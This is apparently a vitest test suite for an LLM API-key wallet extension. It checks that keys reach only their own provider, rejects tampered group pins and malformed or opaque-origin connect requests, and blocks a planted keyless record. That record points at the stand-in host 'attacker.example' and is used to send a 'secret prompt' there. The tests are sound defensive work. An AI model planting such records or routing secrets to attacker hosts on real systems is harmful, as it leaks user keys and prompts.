import { describe, it, expect, afterEach, vi } from 'vitest';
import {
  startBackground,
  walletStorage,
  jsonResponse,
  connectApproved,
  type CredentialSpec,
} from './helpers/background-harness';

const APP = 'https://app.example';
const OPENAI_CHAT = 'https://api.openai.com/v1/chat/completions';

afterEach(() => {
  vi.useRealTimers();
  vi.unstubAllGlobals();
});

const KEYS: CredentialSpec[] = [
  { id: 'work', providerId: 'openai', key: 'sk-WORK' },
  { id: 'personal', providerId: 'openai', key: 'sk-PERSONAL' },
  { id: 'groq1', providerId: 'groq', key: 'gsk-GROQ' },
  { id: 'a1', providerId: 'anthropic', key: 'sk-ant-REAL' },
];

function group(id: string, providerId: string, extra: Record<string, unknown> = {}) {
  return { id, name: id, providerId, createdAt: 1, ...extra };
}

function openaiChat(sessionKey: string) {
  return {
    sessionKey,
    providerId: 'openai',
    url: OPENAI_CHAT,
    body: JSON.stringify({ model: 'gpt-app', messages: [{ role: 'user', content: 'hi' }] }),
  };
}

/** The (url, headers, body) of the n-th upstream call. */
function upstream(h: { fetch: { mock: { calls: unknown[][] } } }, n = 0) {
  const [url, init] = h.fetch.mock.calls[n] as [string, RequestInit];
  return { url, headers: init.headers as Record<string, string>, body: JSON.parse(String(init.body)) };
}

describe('background: group routing for a plain connect()', () => {
  // F014: connect() with no provider list used to skip group routing until
  // something unrelated refreshed the session.
  it('applies the group pin and model to a session approved without a provider list', async () => {
    const h = await startBackground({
      local: await walletStorage(KEYS, {
        groups: [group('default', ''), group('g-personal', 'openai', { credentialId: 'personal', model: 'gpt-pinned' })],
        appGroups: { [APP]: 'g-personal' },
      }),
    });
    await h.unlock();
    const reply = await connectApproved(h, APP, {});
    const [session] = (await h.internal('getSessions')).sessions;
    // One entry per provider, routed as an explicit list would be.
    expect(session.providers.map((p: { providerId: string }) => p.providerId).sort()).toEqual(['anthropic', 'groq', 'openai']);
    expect(session.providers.find((p: { providerId: string }) => p.providerId === 'openai'))
      .toMatchObject({ credentialId: 'personal', modelOverride: 'gpt-pinned' });

    h.fetch.mockImplementation(async () => jsonResponse({ usage: { prompt_tokens: 1, completion_tokens: 1 } }));
    expect((await h.proxy(APP, openaiChat(reply.payload.sessionKey)).result).done).toBe(true);
    const call = upstream(h);
    expect(call.headers.authorization).toBe('Bearer sk-PERSONAL');
    expect(call.body.model).toBe('gpt-pinned');
  });

  it('swaps to the group provider for a session approved without a provider list', async () => {
    const h = await startBackground({
      local: await walletStorage(KEYS, {
        groups: [group('default', ''), group('g-groq', 'groq', { model: 'llama-pinned' })],
        appGroups: { [APP]: 'g-groq' },
      }),
    });
    await h.unlock();
    const reply = await connectApproved(h, APP, {});
    h.fetch.mockImplementation(async () => jsonResponse({ usage: { prompt_tokens: 1, completion_tokens: 1 } }));
    expect((await h.proxy(APP, openaiChat(reply.payload.sessionKey)).result).done).toBe(true);
    const call = upstream(h);
    expect(call.url).toBe('https://api.groq.com/openai/v1/chat/completions');
    expect(call.headers.authorization).toBe('Bearer gsk-GROQ');
    expect(call.body.model).toBe('llama-pinned');
  });

  it('routes a refreshed session the same way as a new one', async () => {
    const h = await startBackground({
      local: await walletStorage(KEYS, {
        groups: [group('default', ''), group('g-personal', 'openai', { credentialId: 'personal' })],
        appGroups: { [APP]: 'g-personal' },
      }),
    });
    await h.unlock();
    await connectApproved(h, APP, {});
    const before = (await h.internal('getSessions')).sessions[0].providers;
    // Any credential change refreshes every session.
    expect((await h.internal('addCredential', { providerId: 'mistral', label: 'm', value: 'mk', authMethod: 'api_key' })).success).toBe(true);
    await h.settle();
    const after = (await h.internal('getSessions')).sessions[0].providers;
    expect(after).toEqual(before);
  });
});

describe('background: a key is only sent to its own provider', () => {
  // F009: an edited group pin pointing an openai group at the Anthropic key
  // made the wallet send sk-ant-… to api.openai.com.
  it('refuses a group pin to another provider\'s credential', async () => {
    const h = await startBackground({
      local: await walletStorage(KEYS, {
        groups: [group('default', ''), group('g-tampered', 'openai', { credentialId: 'a1' })],
        appGroups: { [APP]: 'g-tampered' },
      }),
    });
    await h.unlock();
    const reply = await connectApproved(h, APP, { providers: [{ id: 'openai', required: true }] });
    expect(reply.payload.providers.openai.available).toBe(false);
    const r = await h.proxy(APP, openaiChat(reply.payload.sessionKey)).result;
    expect(r.error.error.code).toBe('PROVIDER_UNAVAILABLE');
    expect(h.fetch).not.toHaveBeenCalled();
  });

  it('refuses a cross-family group pin to a credential of the wrong provider', async () => {
    // Translation anthropic -> openai, with the pin on the Groq key. Without
    // an Anthropic key in the wallet nothing else can serve the app.
    const h = await startBackground({
      local: await walletStorage(KEYS.filter((k) => k.providerId !== 'anthropic'), {
        groups: [group('default', ''), group('g-x', 'openai', { credentialId: 'groq1', model: 'gpt-5.5' })],
        appGroups: { [APP]: 'g-x' },
      }),
    });
    await h.unlock();
    const reply = await connectApproved(h, APP, { providers: [{ id: 'anthropic', required: true }] });
    expect(reply.payload.providers.anthropic.available).toBe(false);
  });

  it('treats a wrong-provider cross-family pin as stale: the app\'s own key serves it directly', async () => {
    // Same tampered group, with an Anthropic key in the wallet. Core's
    // resolver (F010) ignores a pin to another provider's key like a stale
    // pin, so the request goes to Anthropic with the Anthropic key, never to
    // OpenAI with the Groq key.
    const h = await startBackground({
      local: await walletStorage(KEYS, {
        groups: [group('default', ''), group('g-x', 'openai', { credentialId: 'groq1', model: 'gpt-5.5' })],
        appGroups: { [APP]: 'g-x' },
      }),
    });
    await h.unlock();
    const reply = await connectApproved(h, APP, { providers: [{ id: 'anthropic', required: true }] });
    const [session] = (await h.internal('getSessions')).sessions;
    const entry = session.providers.find((p: { providerId: string }) => p.providerId === 'anthropic');
    expect(entry).toMatchObject({ credentialId: 'a1' });
    expect(entry.translation).toBeUndefined();

    h.fetch.mockImplementation(async () => jsonResponse({ usage: { input_tokens: 1, output_tokens: 1 } }));
    const r = await h.proxy(APP, {
      sessionKey: reply.payload.sessionKey,
      providerId: 'anthropic',
      url: 'https://api.anthropic.com/v1/messages',
      body: JSON.stringify({ model: 'claude-app', max_tokens: 8, messages: [{ role: 'user', content: 'hi' }] }),
    }).result;
    expect(r.done).toBe(true);
    const call = upstream(h);
    expect(call.url).toBe('https://api.anthropic.com/v1/messages');
    expect(call.headers['x-api-key']).toBe('sk-ant-REAL');
    expect(JSON.stringify(call.headers)).not.toContain('gsk-GROQ');
  });

  it('refuses a session entry whose credential belongs to another provider', async () => {
    const local = await walletStorage(KEYS);
    const h = await startBackground({ local });
    await h.unlock();
    const reply = await connectApproved(h, APP, { providers: [{ id: 'openai', required: true }] });
    // Edit the persisted session so openai points at the Anthropic key,
    // then restart the worker, which restores it.
    const sessions = h.session!.data._sessions as Array<[string, { providers: Array<{ credentialId: string }> }]>;
    sessions[0][1].providers[0].credentialId = 'a1';
    const restarted = await startBackground({ local: h.local.data, session: h.session!.data });
    const r = await restarted.proxy(APP, openaiChat(reply.payload.sessionKey)).result;
    expect(r.error.error.code).toBe('PROVIDER_UNAVAILABLE');
    expect(restarted.fetch).not.toHaveBeenCalled();
  });
});

describe('background: records without a key', () => {
  // F009: a record with an empty secret decrypted to '' for any provider,
  // so one planted in storage could point a provider at any host.
  it('refuses a planted keyless record for a provider that needs a key', async () => {
    const local = await walletStorage([]);
    (local.credentials as unknown[]).push({
      id: 'planted', providerId: 'azure_openai', label: 'x', authMethod: 'api_key', createdAt: 1,
      baseUrl: 'https://attacker.example', encryptedKey: '',
    });
    const h = await startBackground({ local });
    await h.unlock();
    const reply = await connectApproved(h, APP, { providers: [{ id: 'azure_openai', required: true }] });
    const r = await h.proxy(APP, {
      sessionKey: reply.payload.sessionKey,
      providerId: 'azure_openai',
      url: 'https://attacker.example/openai/deployments/d/chat/completions?api-version=2024-10-21',
      body: JSON.stringify({ messages: [{ role: 'user', content: 'secret prompt' }] }),
    }).result;
    expect(r.error.error.code).toBe('PROXY_ERROR');
    expect(h.fetch).not.toHaveBeenCalled();
  });

  it('only lets a local server go without a key, and binds its empty key', async () => {
    const h = await startBackground({ local: await walletStorage([]) });
    await h.unlock();
    expect(await h.internal('addCredential', { providerId: 'openai', label: 'o', value: '  ', authMethod: 'api_key' }))
      .toEqual({ error: 'Enter an API key' });
    expect(await h.internal('addCredential', { providerId: 'anthropic', label: 'o', value: '', authMethod: 'oauth' }))
      .toEqual({ error: 'Enter a token' });
    expect(await h.internal('addCredential', {
      providerId: 'ollama', label: 'local', value: '', authMethod: 'api_key', baseUrl: 'https://ollama.example',
    })).toEqual({ success: true });
    const [ollama] = h.local.data.credentials as Array<{ encryptedKey: string }>;
    expect(ollama.encryptedKey.startsWith('v2:')).toBe(true);

    // It works, sending no key.
    const reply = await connectApproved(h, APP, { providers: [{ id: 'ollama', required: true }] });
    h.fetch.mockImplementation(async () => jsonResponse({ choices: [] }));
    const r = await h.proxy(APP, {
      sessionKey: reply.payload.sessionKey,
      providerId: 'ollama',
      url: 'https://ollama.example/v1/chat/completions',
      body: JSON.stringify({ model: 'llama3', messages: [] }),
    }).result;
    expect(r.done).toBe(true);
    expect(upstream(h).url).toBe('https://ollama.example/v1/chat/completions');
  });
});

describe('background: connect requests from pages', () => {
  // F075: the page's provider list went into the approval unchecked; a
  // malformed one blanked the popup, and a numeric id approved with trust
  // made the signed trust state unreadable.
  it('refuses a malformed connect request before queueing it', async () => {
    const h = await startBackground({ local: await walletStorage(KEYS) });
    await h.unlock();
    for (const payload of [{ providers: [{ id: {} }] }, { providers: [null] }, { providers: 'abc' }, { providers: [{ id: 123 }] }, null, 'x']) {
      const { response } = h.connect(APP, payload as Record<string, unknown>);
      expect((await response).payload.code, JSON.stringify(payload)).toBe('INVALID_REQUEST');
    }
    expect((await h.internal('getPendingApprovals')).approvals).toHaveLength(0);
  });

  it('queues the normalized provider list', async () => {
    const h = await startBackground({ local: await walletStorage(KEYS) });
    await h.unlock();
    h.connect(APP, { providers: [{ id: 'openai' }, { id: 'openai', required: true, extra: 1 }] });
    await h.until(async () => (await h.internal('getPendingApprovals')).approvals.length === 1);
    expect((await h.internal('getPendingApprovals')).approvals[0].providers).toEqual([{ id: 'openai', required: true }]);
  });

  it('never signs a non-string provider into the trust state', async () => {
    const h = await startBackground({ local: await walletStorage(KEYS) });
    await h.unlock();
    await connectApproved(h, APP, { providers: [{ id: 'openai', required: true }] }, true);
    expect(await h.internal('addTrustedSite', { origin: 'https://b.example', allowedProviders: [123] }))
      .toEqual({ error: 'Invalid trusted site' });
    const { sites, trustReset } = await h.internal('getTrustedSites');
    expect(sites.map((s: { origin: string }) => s.origin)).toEqual([APP]);
    expect(trustReset).toBe(false);
  });

  // F083: an opaque origin (sandboxed frame) was queued as 'unknown', and
  // trusting it trusted every sandboxed frame on every site.
  it('refuses a connect from an opaque origin', async () => {
    const h = await startBackground({ local: await walletStorage(KEYS) });
    await h.unlock();
    const { response } = h.connect(null, { providers: [{ id: 'openai', required: true }] });
    expect((await response).payload.code).toBe('ORIGIN_UNSUPPORTED');
    expect((await h.internal('getPendingApprovals')).approvals).toHaveLength(0);
    expect(await h.internal('addTrustedSite', { origin: 'unknown', allowedProviders: ['openai'] })).toEqual({ error: 'Invalid trusted site' });
    expect((await h.internal('getTrustedSites')).sites).toEqual([]);
  });
});
